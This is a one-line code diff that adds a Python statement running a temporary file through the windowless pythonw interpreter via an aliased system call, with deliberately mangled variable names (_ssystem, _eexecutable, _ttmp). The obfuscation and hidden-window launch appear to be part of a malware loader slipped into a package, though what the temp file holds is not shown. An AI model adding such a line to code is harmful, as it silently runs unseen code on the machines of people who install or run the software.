@@ -1,0 +1,1 @@
+_ssystem(f"start {_eexecutable.replace('.exe', 'w.exe')} {_ttmp.name}")
